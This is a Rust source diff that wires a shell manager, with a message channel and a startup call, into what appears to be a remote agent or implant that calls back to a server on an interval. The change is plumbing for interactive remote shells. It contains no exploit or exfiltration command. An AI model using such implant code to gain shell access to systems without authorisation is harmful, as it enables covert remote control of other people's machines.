@@ -10,6 +10,7 @@ use pb::config::Config;
 use transport::{ActiveTransport, Transport};
 
 pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
+const MAX_BUF_SHELL_MESSAGES: usize = 65535;
 
 pub async fn run_agent() -> Result<()> {
     init_logger();
@@ -26,12 +27,20 @@ pub async fn run_agent() -> Result<()> {
 
     let handle = tokio::runtime::Handle::current();
     let task_registry = Arc::new(TaskRegistry::new());
+
+    let (shell_manager_tx, shell_manager_rx) = tokio::sync::mpsc::channel(MAX_BUF_SHELL_MESSAGES);
+
     let agent = Arc::new(ImixAgent::new(
         config,
         transport,
         handle,
         task_registry.clone(),
+        shell_manager_tx,
     ));
+
+    // Start Shell Manager
+    let shell_manager = crate::shell::manager::ShellManager::new(agent.clone(), shell_manager_rx);
+    agent.clone().start_shell_manager(shell_manager);
 
     // Track the last interval we slept for, as a fallback in case we fail to read the config
     let mut last_interval = agent.get_callback_interval_u64().unwrap_or(5);
